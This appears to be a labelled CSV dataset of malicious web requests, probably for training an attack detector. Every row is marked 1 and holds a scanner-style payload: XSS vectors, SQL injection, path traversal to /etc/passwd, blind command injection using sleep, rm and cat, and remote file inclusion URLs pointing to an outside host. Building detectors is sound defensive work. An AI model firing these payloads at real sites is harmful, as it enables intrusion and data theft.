code,status
 else sleep 1,1
\\/><object data='data:text/html;base64,1
"/edzaia0i.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/yfmo7jpwvpv1.php,1
/rbec2ohx.php3?<script>cross_site_scripting.nasl</script>,1
/javascript/show_post.exe,1
/javascript/transparent.exe,1
/linkadmin.php?page=XXpathXX?,1
/include.php?gorumDir=XXpathXX,1
/speedberg/include/generalToolBox.tlb.php?SPEEDBERG_PATH=XXpathXX,1
<SCRIPT SRC=%(jscript)s?<B>,1
%22,1
/javascript/c.exe,1
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},1
/javascript/family.exe,1
/javascript/.passwd.pem,1
"/en-us/33y9gcqq.nsf?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
><svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);confirm(0);>,1
/6wb70v0b.asp?<script>cross_site_scripting.nasl</script>,1
"/a0imiuf1.html?<script>document.cookie=""testxqrn=4654;""</script>",1
"/top.php?stuff=""rm\x09q22258799\x09#",1
"/6wb70v0b.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
& sleep 0 && str=$(echo ERXFFG) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 ,1
"/6dlc2zm9.pl?<script>document.cookie=""testqpux=4016;""</script>",1
"/nmw0do67.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/top.php?stuff=""&ver;>q13316957&rem;",1
/paged'accueil/,1
 str=$(echo HUZGZZ),1
/javascript/forrest.exe,1
 str1=${#str},1
/scripts/test.php,1
/bl8sefdm.exe?<script>cross_site_scripting.nasl</script>,1
/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},1
&#X03c,1
/yver8r9o.kspx?<script>cross_site_scripting.nasl</script>,1
'&echo$IFSZYAICF$((49+53))$(echo$IFSZYAICF)ZYAICF|,1
/examples/jsp/checkbox/kb.cgi?view='&lang=en,1
"/s7qus4g3.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
//<body><script src=http://www.example.com/test?rnd=q98513167></script>,1
'1+or+1=1--,1
/cgi-bin/whois.cgi?action=load&whois=;id,1
"/rpxyx07v.pl?<meta http-equiv=set-cookie content=""testbnli=1975"">",1
/activeauctionsuperstore/iteminfo.asp?itemid=42',1
)print(`echo NNYPSL`.`echo $((56+33))`.`echo NNYPSL`.`echo NNYPSL`);.'NNYPSL,1
'&&echo TWKYHE$((0+57))$(echo TWKYHE)TWKYHE|,1
 fi %5C%5C,1
 str=$(echo WUDXTS),1
 else sleep 1,1
"+onfocus=prompt(1)""+",1
/examples/jsp/error/index.php?show=/etc/passwd,1
/examples/jsp/num/forum_2.php?msg=10&return=<script>foo</script>,1
/examples/jsp/security/protected/j_security_check;jsessionid=5680ad1b9956cf0a8a9f08a20f983ee6194853687.tmp,1
/examples/servlets/servlet/index.php?user_langue=../../../../../../../../../../etc/passwd,1
 fi %2F%2F,1
/opensiteadmin/scripts/classes/form.php?path=http://192.168.202.118:8080/tzhfyzkbomspvm?\x00,1
/bigace/system/classes/sql/AdoDBConnection.php?GLOBALS[_BIGACE][DIR][addon]=XXpathXX?,1
"/jujgxwav.jsp?<meta http-equiv=set-cookie content=""testknim=9383"">",1
/javascript/on.exe,1
"/help.php?q=""ping\x09-w\x099000\x09-n\x091\x091.2.3.4&rem\x09",1
"/main.php?logout=""\x0arm\x09q98198938\x09#",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+q+>>esbq",1
 else sleep 1,1
/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=http://192.168.202.118:8080/2aibfaczmac8??,1
 then sleep 0,1
/javascript/submit.exe,1
"/code/inc_header.php?gtopnombre=""><script>alert('wvs-xss-magic-string-411626083441');</script><test=""",1
/phpmyadmin/netauth.cgi?cmd=show&page=../../../../../../../../../etc/passwd,1
/templates/2blue/bodyTemplate.php?serverPath=XXpathXX?,1
"/9kr0ih0v.php3?<script>document.cookie=""testzgnm=1183;""</script>",1
/d765w06j.dll?<script>cross_site_scripting.nasl</script>,1
/main.php?stuff='|sleep\x0911\x09#,1
/examples/jsp/cal/anacondaclip.pl?template=../../../../../../../../../../../../../../../etc/passwd,1
echo$IFSFOGUBG$((54+25))$(echo$IFSFOGUBG)FOGUBG&,1
/top.php?stuff=\x0auname >q48279772 #,1
 fi \\,1
"/ewc3rz1l.do?<script>document.cookie=""testkgqo=204;""</script>",1
/scripts/index.php?id=egyb16sayu',1
1 or 1 in (@@version)--,1
/scripts/editor/filemanager/connectors/php/upload.php?command=fileupload&type=file&currentfolder=/fckeditor_currentfolder_file_upload-1331909442.php.,1
/examples/jsp/checkbox/mapserv.exe?map=mapserver_detect.nasl.map,1
/scripts/rwcgi60,1
'sqlattempt1,1
/../../../../../../../../{FILE},1
 else sleep 1,1
"/9ko6m4c8.mscgi?<script>document.cookie=""testylik=3403;""</script>",1
"/bzuf9ozq.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
; str=$(echo RPPEVG); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %22,1
/examples/jsp/error/zml.cgi?file=../../../../../../../../../../../../etc/passwd\x00,1
"/if69ddo1.exe?<meta http-equiv=set-cookie content=""testiabz=5220"">",1
"</svg>//[""'`-->]]>]</div>",1
; str=$(echo CHSJVY); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+06+00+00+00+00+00+00+00+00+00+00+00+00+00+00+20+00+00+e0+44+41+54+41+00+00++>>ctdn",1
"/top.php?stuff=""ping;-w;9000;-n;1;1.2.3.4|rem;",1
"&&echo FNCMMT$((70+94))$(echo FNCMMT)FNCMMT|
|echo HJHZHR$((26+15))$(echo HJHZHR)HJHZHR|",1
/cfide/scripts/ajax/fckeditor/editor/filemanager/connectors/cfm/cf5_connector.cfm?command=fileupload&type=file&currentfolder=/,1
/plugins/safehtml/safehtml.php?dir[plugins]=XXpathXX?,1
/intern/admin/other/backup.php?admin=1&rootdir=XXpathXX,1
/include/forms.php?INCLUDE_DIR=XXpathXX?,1
%22| [ 8 -ne $(echo ZDDHYL | tr -d '\n' | wc -c) ] || sleep 1 #,1
 then sleep 0,1
/help.php?q=rm;q25171792&rem;,1
"><svg onload=alert(1)//
onmouseover=alert(1)//",1
 fi ,1
/cgi-bin/js/scripts.php?load=/etc/passwd\x00,1
 str1=${#str},1
/scripts/eezuu7xc7ge3.php,1
/cacti/lang/index.php?file=/etc/passwd,1
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,1
/smokin'/,1
/scripts/admin.php?loggedin=1,1
"/addvip.php?msetstr[""progsdir""]=http://192.168.202.118:8080/moclyxlwqyfjnp?",1
/cgi-bin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1332008327')</script>,1
 then sleep 0,1
 else sleep 1,1
"/<script>document.cookie=""testquyx=2820;""</script>",1
/main.php?stuff='\x0drm\x09q27918964\x09#,1
%27& sleep 0 && str=$(echo XDAIBC) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %7C,1
| [ 5 -ne $(echo QJDBJN | tr -d '\n' | wc -c) ] || sleep 1 ',1
 str=$(echo RPJJIB),1
/scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332008334,1
 else sleep 1,1
/%uff0e%uff0e\%uff0e%uff0e\{FILE},1
&#x003c;,1
/main.php?stuff=';del\x09q87217698\x09#,1
"|echo SAQMPN$((71+20))$(echo SAQMPN)SAQMPN|
||echo YWODEP$((80+41))$(echo YWODEP)YWODEP|",1
 str1=${#str},1
"/cgi-binsearch_results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/",1
/examples/jsp/error/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl,1
"'""--></style></script><script>shadowlabs(0x000045)</script>",1
/phpmyadmin/index.php?entry=',1
/eei78ore.mscgi?<script>cross_site_scripting.nasl</script>,1
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",1
 else sleep 1,1
 if [ 5 -ne ${str1} ],1
/phpmyadmin/index.php?selskin=../inc/boxleft.inc\x00&xposbox[l][]=/etc/passwd\x00,1
<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET',1
/scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=http://192.168.202.118:8080/ghl9il?,1
/zmvq66jy.cgi?<script>cross_site_scripting.nasl</script>,1
/javascript/nets.exe,1
XXX,1
/scripts/sc877q2pzqne.pl,1
"/miz4r5hz.htm?<script>document.cookie=""testviqu=1270;""</script>",1
',1
/top.php?stuff='|sleep\x099\x09#,1
"/esmozg5d.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/lsoix5h3.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
& sleep 0 && str=$(echo AIVPGH) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 ,1
/scripts/rihzp7swr3p6.php3,1
/7uz3ok60.mscgi?<script>cross_site_scripting.nasl</script>,1
 else sleep 1,1
/javascript/.passwd.tar,1
',1
/en-us/dda2qr7j.cgi?<script>cross_site_scripting.nasl</script>,1
 if [ 6 -ne ${str1} ],1
/includes/events.inc.php?PagePrefix=XXpathXX,1
"/edv3mapy.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
| [ 5 -ne $(echo SQHKCG | tr -d '\n' | wc -c) ] || sleep 1 &,1
/stphpform.php?STPHPLIB_DIR=XXpathXX,1
/php/php.exe?c:\winnt\win.ini,1
 str=$(echo VOOIFO),1
/admin/addentry.php?phpbb_root_path=/etc/passwd\x00,1
"/fpnpp5zg.x?<meta http-equiv=set-cookie content=""testyias=101"">",1
/scripts/app_and_readme/navigator/index.php?page=http://192.168.202.118:8080/zz5thkvtmlgl?,1
%22; str=$(echo ZWBBRM); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %7C,1
/..\..\..\{FILE},1
"<x repeat=""template"" repeat-start=""999999"">0<y repeat=""template"" repeat-start=""999999"">1</y></x>",1
/conf.php?securelib=XXpathXX,1
/prescription drug program/,1
/cgi-perl/fileseek.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=,1
 fi \\,1
/subscriptions.ws,1
/top.php?stuff=&ping;-w;9000;-n;1;4.3.2.1&rem;,1
/transcription-r0/,1
 then sleep 0,1
/phpwcms_template/inc_script/frontend_render/navigation/config_phplm.php?html_menu_dirpath=http://192.168.202.96:8080/4dckqcc0acprbz?,1
 str=$(echo OGEKGC),1
/web/BetaBlockModules/UserPhotoModule/UserPhotoModule.php?path_prefix=XXpathXX,1
 str1=${#str},1
"onContextMenu=&#x000061;&#x00006c;&#x000065;&#x000072;&#x000074;&#x000028;&#x000027;&#x000058;&#x000053;&#x000053;&#x000027;&#x000029;""",1
/cgi-local/fileseek.cgi?foot=;cat /etc/passwd&head=,1
/pxagj7n7.html?<script>cross_site_scripting.nasl</script>,1
"/rbec2ohx.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/d44uk9h2.cgi?<meta http-equiv=set-cookie content=""testmybc=2088"">",1
/manager/media/browser/mcpuk/connectors/php/commands/thumbnail.php?base_path=/etc/passwd\x00,1
"/pxagj7n7.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 else sleep 1,1
"/ywaxntrx.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 str=$(echo ZDSKKE),1
/replicas.exe,1
'print(`echo UPGYTK;echo $((49+93));echo UPGYTK;echo UPGYTK`);.%22UPGYTK,1
/news/include/customize.php?l=XXpathXX?,1
/..\..\..\..\..\{FILE},1
%27,1
/scripts/gitweb.cgi,1
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=ftr8qa709ryjzezou,1
; str=$(echo TWCHKU); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,1
 then sleep 0,1
/javascript/cgi-shl.exe,1
/wikka.php?wakka=homepage/../../actions/wikkachanges,1
/ultimate php script collection/,1
/index.php?src=1&_common=1&time=1332009308&action=show_view&module=calendarmodule&view=../../../../../../../../../../etc/passwd\x00,1
${popen(print(`echo BZLGPL;echo $((70+63));echo BZLGPL;echo BZLGPL`);%29%7DBZLGPL,1
/..\xc0\xaf/host-manager/html,1
"<script src=""/\%(jscript)s""></script>",1
'||echo$IFSTQUEWX$((62+61))$(echo$IFSTQUEWX)TQUEWX,1
"/main.php?stuff="";uname >q31473843 #",1
echo$IFSMOMQCI$((63+38))$(echo$IFSMOMQCI)MOMQCI|,1
"/cgi-bin/htsearch.cgi?words=""><script>alert%'vulnerable');</script>",1
 else sleep 1,1
%22; str=$(echo GJYXKU); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,1
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",1
/citrix//accessplatform/auth/clientscripts/cookies.js,1
/scripts/nckowqpd4zng.cgi,1
..\..\..\..\..\..\..\..\..\..\boot.ini,1
"/odzk29aa.php?<meta http-equiv=set-cookie content=""testtfvh=2141"">",1
/zipndownload.php?PP_PATH=XXpathXX?,1
/help.php?q=ver\x0c>q83193297&rem\x0c,1
/sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script>,1
%27,1
/cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1
<IMG+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#39;&#41;>,1
 str1=${#str},1
/examples/servlets/servlet/ovlaunch.exe,1
ORDER BY 16-- ,1
&#x0003c;,1
${popen(print(`echo VDXXJI;echo $((50+12));echo VDXXJI;echo VDXXJI`);%23VDXXJI,1
& sleep 0 && str=$(echo FAGBBN) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 %7C,1
/archive.php?scriptpath=http://192.168.202.118:8080/moclyxlwqyfjnp??,1
/cgi-bin/fpsrvadm.exe,1
/cgi-914/nph-showlogs.pl?files=../../&filter=.*&linecnt=500&refresh=0&submit=go,1
"<animate attributeName=""xlink:href"" begin=""0"" from=""javascript:alert(137)"" to=""&"" />",1
/examples/jsp/sessions/index.php?album=../../../../../../../../../../etc/passwd\x00,1
/robocop director's cut/,1
 str1=${#str},1
"/en-us/odzk29aa.mscgi?<script>document.cookie=""testtfvh=2141;""</script>",1
'&&echo VFVJGA$((34+26))$(echo VFVJGA)VFVJGA&,1
 str1=${#str},1
/scripts/editor/filemanager/connectors/php/upload.php?command=fileupload&type=file&currentfolder=/fckeditor_currentfolder_file_upload-1331904249.php.,1
/recordings/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl,1
"; str=$(echo NBAQGO); str1=${#str}; if [ 3 -ne ${str1} ]; then sleep 0; else sleep 1; fi |
; str=$(echo NBAQGO); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi |",1
 fi //,1
/script/gestion/index.php?path_inc=http://192.168.202.96:8080/4dckqcc0acprbz?,1
/managesubscriptions/,1
,1
 if [ 9 -ne ${str1} ],1
"/main.php?stuff=""ping\x0b-w\x0b11000\x0b-n\x0b1\x0b4.3.2.1|rem\x0b",1
"/yver8r9o.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
'echo GGRVQX$((86+56))$(echo GGRVQX)GGRVQX//,1
/script/tick/test.php?PATH_TO_CODE=XXpathXX,1
/_head.php?_zb_path=../../../../../../../../../../etc/passwd\x00,1
/main.php?stuff=rm;q96335299&rem;,1
/archive.php?scriptpath=http://192.168.202.96:8080/ipb5ri??,1
/javascript/document.yml,1
"/g8nu2yy7.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
'|echo QIQGXS$((79+42))$(echo QIQGXS)QIQGXS',1
/javascript/.passwd.7z,1
<script>alert(document.head.innerHTML.substr(146,1
"/j4drbkil.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
 str=$(echo LJKRDD),1
/scripts/index.php?id='union/**/select/**/0,1
"/en-us/ddoworrl.php3?<script>document.cookie=""testvlau=8517;""</script>",1
"/gvx7m5ti.jsp?<script>document.cookie=""testwldz=3506;""</script>",1
/../../../../../../{FILE},1
/scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1
"/rpxyx07v.cgi?<meta http-equiv=set-cookie content=""testbnli=1975"">",1
"/x2gyorli.jsp?<meta http-equiv=set-cookie content=""testwhac=3130"">",1
"/top.php?stuff=""&rm\x0bq54461117&rem\x0b",1
& sleep 0 && str=$(echo IYDPRO) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 %2F%2F,1
 str1=${#str},1
 if [ 6 -ne ${str1} ],1
/help.php?q=ping;-w;10000;-n;1;1.2.3.4&rem;,1
/scripts/2pwudii1mt22.php3,1
/t3af3tdz.idc?<script>cross_site_scripting.nasl</script>,1
"/rbec2ohx.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/el/sawmillcl.exe?ho+{complete_version},1
<a/href=java&Tab;script:confirm(/XSS/)>click</a>,1
',1
/examples/jsp/num/squirrelcart/cart_content.php?cart_isp_root=/etc/passwd\x00,1
 str1=${#str},1
/manager/resetpw.php?email=../../../../../../../../../../../../etc/passwd,1
<script>({0:#0=confirm/#0#/#0#(0)})</script>,1
"/a0imiuf1.x?<meta http-equiv=set-cookie content=""testxqrn=4654"">",1
 and 1=( if((load_file(char(110,1
/../../../../../../../../{FILE},1
/edzaia0i.exe?<script>cross_site_scripting.nasl</script>,1
/javascript/lib.exe,1
 str1=${#str},1
/forum/lostpassword.php?repertorylevel=XXpathXX?,1
0&q=';alert(String.fromCharCode(88,1
/cgi-sys/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\,1
/cgi-bin/sgdynamo.exe?htname=sgdynamo.exe,1
'),1
 str1=${#str},1
"<div style=""font-family:foo}color=red;"">XXX</div>",1
"<div style=""font-family:'foo&#10;;color:red;';"">LOL",1
"<![><img src=""]><img src=x onerror=alert(XSS)//"">",1
/javascript/info.exe,1
;echo PDWIBS$((76+7))$(echo PDWIBS)PDWIBS',1
 then sleep 0,1
"/eei78ore.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
%27,1
"/b5xdqgz2.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/phpmyadmin/nessus""><script>alert('mod_perl_status_uri_xss.nasl')</script>",1
/examples/jsp/jsp2/el/login.php?lang=/../../../../../../../../../../../../etc/passwd\x00.txt,1
/ows-bin/apexec.pl?etype=odp&passurl=/category/&template=../../../../../../../../../../etc/passwd\x00.html,1
%3cscript%3ealert(document.cookie)%3c/script%3e,1
"/azcrfs8d.x?<script>document.cookie=""testjpdr=9205;""</script>",1
/cacti/c32web.exe/getimage?imagename=cart32.ini\x00.gif,1
/cgi-bin/upgrade/index.php?steporder[]=../../../../../../../../../../../../etc/passwd\x00,1
/scripts/index.php?search='><script>alert('autoindex_search_xss.nasl');</script>&searchmode=f,1
/scripts/eezuu7xc7ge3.php3,1
 str1=${#str},1
"
 str=$(echo ROWALZ)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '
",1
/cgi-bin/supporter/tupdate.php?groupid=change&sg=',1
"/8t9v8k7x.idc?<meta http-equiv=set-cookie content=""testhvje=9403"">",1
; str=$(echo MSPTMX); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi ,1
/cgi-bin/shoutbox.php?conf=../,1
 else sleep 1,1
 then sleep 0,1
/xmlforscript/,1
/help.php?q='\x0duname >q58812882 #,1
"//<body><script/src=""http://www.example.com/test?rnd=q96295372""></script>",1
/msadc/..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc../winnt/system32/cmd.exe?/c+dir+c:\+/og,1
echo $((24+1)),1
/manager/sendcard.php?view=1&id='sendcard_sql.nasl,1
 then sleep 0,1
/firewall/policy/dlg?q=-1&fzone=t<script>alert('vulnerable')</script>>&tzone=dmz,1
/scripts/apgafvcxoeeh.php,1
 fi %27,1
/javascript/cc.exe,1
/examples/jsp/colors/tinybrowser/upload.php?badfiles=1><script>alert('tinybrowser_multiple_xss.nasl')</script>,1
"`'><script>\xC2\xA0javascript:alert(1)</script>
<img \x00src=x onerror=alert(1)"">",1
/<200603291315/,1
';alert(String.fromCharCode(88,1
 then sleep 0,1
/cacti/index.php?x=browse&category='union select '1',1
&echo QPEVFY$((91+41))$(echo QPEVFY)QPEVFY,1
/administrator/menu_add.php?site_absolute_path=XXpathXX?,1
/comments.php?scriptpath=http://192.168.202.118:8080/iroy1gvqrrqu??,1
/m5103snj.mscgi?<script>cross_site_scripting.nasl</script>,1
/main.php?stuff=';del q39366727 #,1
/../..//../..///{FILE},1
& sleep 0 && str=$(echo WQWTED) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 \\,1
/x'squeezeme!_v3/,1
"/en-us/<meta http-equiv=set-cookie content=""testfutf=1550"">",1
";location.href='http://site';//
><script>alert(1)</script>=1""onPaste=""eval(';)\'SSX\'(trela'.split('').reverse().join(''))""",1
"/5qnlm5z2.cfm?<meta http-equiv=set-cookie content=""testsixi=8451"">",1
 str1=${#str},1
/iisadmpwd/..%u00255c..%u00255c/winnt/system32/cmd.exe?/c+dir+c:\+/og,1
<body language=vbs onload=confirm-1,1
/examples/jsp/jsp2/jspx/htmlscript?../../../../../../../../../etc/passwd,1
"/main.php?logout=""sleep\x097\x09#",1
"/h5i6crm3.idc?<meta http-equiv=set-cookie content=""testlihk=7070"">",1
 else sleep 1,1
"/fc9t54l7.html?<meta http-equiv=set-cookie content=""testggad=2000"">",1
 str1=${#str},1
 str=$(echo HHRCUR),1
/scripts/index.php?x=browse&category='union select '1',1
; str=$(echo KWXVRQ); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,1
/admin/index.php?path_to_script=http://192.168.202.96:8080/llumt7msyau5y??&cmd=ls,1
/b5xdqgz2.x?<script>cross_site_scripting.nasl</script>,1
/javascript/customers.exe,1
/ju0u7kfo.do?<script>cross_site_scripting.nasl</script>,1
&&echo GHXSEE$((91+16))$(echo GHXSEE)GHXSEE',1
"/en-us/oie504mr.jspa?<meta http-equiv=set-cookie content=""testtpby=7052"">",1
"/b1q8bywu.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/using logon scripts figure 71102332930350/,1
<iframe/src=j&Tab;av&Tab;as&Tab;cri&Tab;pt&Tab;:co&Tab;nfir&Tab;m&Tab;(&Tab;&Tab;1&Tab;)>,1
<script,1
/cgis/a1stats/a1disp4.cgi?../../../../../../../etc/passwd,1
 else sleep 1,1
"/main.php?logout=""ver&rem",1
/cgi-bin/webcart.cgi?config=mountain&change=yes&nextpage=;id|&code=phold,1
 then sleep 0,1
'&&echo XWGNWJ$((33+16))$(echo XWGNWJ)XWGNWJ\\,1
"<img \x12src=x onerror=""javascript:alert(1)"">",1
"<meta http-equiv=set-cookie content=""testlerc=2575"">",1
;echo$IFSSKFBVG$((56+51))$(echo$IFSSKFBVG)SKFBVG&,1
/scripts/2sfdqydfaknx.inc,1
/admin/system/include.php?skindir=XXpathXX,1
/zipwise field descriptions/,1
| [ 7 -ne $(echo AWKJGV | tr -d '\n' | wc -c) ] || sleep 1 ,1
/phpmyadmin/search.cgi?..\..\..\..\..\..\winnt\win.ini,1
/d765w06j.x?<script>cross_site_scripting.nasl</script>,1
"/main.php?stuff=""&ping",1
"/top.php?stuff=""&ver&rem\x0b",1
<BODY ONLOAD=javascript:javascript:alert(1)>,1
"<svg xmlns=""http://www.w3.org/2000/svg""><set attributeName=""onmouseover"" to=""alert(1)""/><animate attributeName=""onunload"" to=""alert(1)""/></svg>",1
"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=""javascript:parent.x(window);""></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET'",1
echo DGPFLA$((83+1))$(echo DGPFLA)DGPFLA',1
 fi #,1
/dialogs/a.php?spaw_dir=XXpathXX?&cmd=id,1
/main.php?stuff=&ver;>q66756841&rem;,1
"/nyvbv05h.jspa?<meta http-equiv=set-cookie content=""testftxz=5980"">",1
/*,1
/copying/q33749448&#38;q3338&#34;q3338&#60;q3338&#62;q33749448,1
"/6dlc2zm9.jspa?<meta http-equiv=set-cookie content=""testqpux=4016"">",1
/inc/mtdialogo.php?pathCGX=XXpathXX,1
/cacti/index.php?id='union/**/select/**/0,1
echo CJDAVC$((37+56))$(echo CJDAVC)CJDAVC,1
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1
"| [ 9 -ne $(echo MRDZPJ | tr -d '\n' | wc -c) ] || sleep 1 """,1
',1
 str1=${#str},1
& sleep 0 && str=$(echo FEGQZM) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 //,1
/en-us/account/mlog.html?screen=/etc/passwd,1
"/zmvq66jy.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
& sleep 0 && str=$(echo UIVPGT) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %26,1
&#0060,1
/script_path/config.inc.php?_path=http://192.168.202.118:8080/ghl9il??,1
"/bzuf9ozq.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripting languages/,1
/javascript/action.exe,1
/javascript/mission.exe,1
 then sleep 0,1
"/en-us/i686v90l.do?<script>document.cookie=""testfutf=1550;""</script>",1
/confirmunsubscription.php?output=http://192.168.202.96:8080/txenjrxf3?,1
/cgi-bin/_head.php?_zb_path=../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/sessions/cgi/tseekdir.cgi?location=/etc/passwd\x00,1
"/n9xlumt5.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
| [ 8 -ne $(echo WIGALP | tr -d '\n' | wc -c) ] || sleep 1 %22,1
"/en-us/ddoworrl.do?<script>document.cookie=""testvlau=8517;""</script>",1
"/main.php?logout=""&rm q52615858&rem ",1
 fi %7C,1
http://www.<script>alert(1)</script .com,1
"/examples/jsp/cal/search/results.stm?indexname=>""><script>foo</script>&style=fancy&spage=60&query=folder name",1
"/fpnpp5zg.kspx?<script>document.cookie=""testyias=101;""</script>",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+4c+cd+21+54+68+69+73+20+70+72+6f+67+72+61+6d+20+63+61+6e+6e+6f+74+20+62+65++>>esbq",1
"/cgi-bin/awstatstotals.php?sort=""].passthru('id').exit().$a[""",1
/content/base/build/explorer/none.php?/etc/passwd,1
"/n9xlumt5.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"`'><script>\x3Bjavascript:alert(1)</script>
`'><script>\x0Djavascript:alert(1)</script>",1
/javascript/jmx-console.exe,1
; str=$(echo YSDKBB); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi ',1
"/gy23xnjq.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/9o6g5vkn.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/owl.exe,1
${shell_exec(print(`echo NHQIAE\necho $((63+50))\necho NHQIAE\necho NHQIAE`);.%252522NHQIAE,1
/main.php?frm_daynight=q65675462&frm_passwd=&frm_referer=http://192.168.23.202/top.php?stuff=2040844887&frm_user=&scr_height=&scr_width=,1
/scripts/customer.pl,1
